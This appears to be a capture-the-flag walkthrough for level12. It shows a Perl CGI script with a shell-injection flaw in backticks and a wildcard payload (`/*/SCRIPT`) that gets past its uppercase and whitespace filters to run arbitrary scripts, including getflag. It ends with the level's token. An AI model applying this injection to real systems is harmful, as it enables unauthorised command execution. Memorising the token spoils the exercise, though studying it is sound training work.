In the folder **home** there is a file **level12.pl** containing :

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
	$nn = $_[1];
	$xx = $_[0];
	$xx =~ tr/a-z/A-Z/;						# Put in uppercase
	$xx =~ s/\s.*//;						# Deletes all \s\t\r\n
	@output = `egrep "^$xx" /tmp/xd 2>&1`;
	foreach $line (@output) {
		($f, $s) = split(/:/, $line);
		if($s =~ $nn) {
			return 1;
		}
	}
	return 0;
}

sub n {
	if($_[0] == 1) {
		print("..");
	} else {
		print(".");
	}
}
```
We notice in the code that there are "safeties" in relation to the parameter **x**, the latter must be in upper case and without [\s\t\r\n].
So we try to get through these securities by creating a file in **/tmp** in upper case and using wildcards.
We check the rights :

<pre><code>> echo "whoami > /tmp/test" > /tmp/SCRIPT
> chmod 777 /tmp/SCRIPT
</code></pre>
> The **chmod** is important because we must be able to execute /tmp/SCRIPT without using <code>sh</code>

Then we will use the flaw by going to :
<pre>http://IP:4646/?x=`/*/SCRIPT`</pre>
> x takes in value /*/SCRIPT in injection, which thanks to the wildcard gives us /tmp/SCRIPT

> Making a curl here doesn't work, because the rights taken will be those of **level12**

<pre><code>> cat /tmp/test
flag12</code></pre>

The rights are good so we deal with <code>getflag</code>

<pre><code>> echo "getflag > /tmp/test" > /tmp/SCRIPT
> chmod 777 /tmp/SCRIPT
</code></pre>
<pre>http://IP:4646/?x=`/*/SCRIPT`</pre>
<pre><code>> cat /tmp/test
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr</code></pre>
